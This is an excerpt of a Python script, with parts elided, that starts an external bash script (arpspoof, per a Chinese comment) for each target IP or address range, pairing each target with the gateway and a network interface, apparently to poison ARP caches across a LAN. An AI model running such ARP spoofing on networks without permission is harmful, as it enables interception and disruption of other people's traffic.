...
try:
    if not result.n:
        ...
        for targetIP in result.l[:-1]:
            # print(f'Run IP: {targetIP}')
            # print(f'Gateway IP : {result.l[-1]}')
            # 以异步方式运行 arpspoof
            proc = subprocess.Popen(['bash', result.f or 'arp_run.sh', targetIP, result.l[-1], result.i or 'eth0'])
        ...
        for targetIP in range(int(netResult[0].split('.')[-1]), int(netResult[1].split('.')[-1]) + 1):
            ...
            if netResult[0][:-len(netResult[0].split('.')[-1])] + str(targetIP) in (result.s or []):
                continue
            # print(f'Run IP: {netResult[0][:-len(netResult[0].split('.')[-1])] + str(targetIP)}')
            # print(f'Gateway IP : {result.r}')
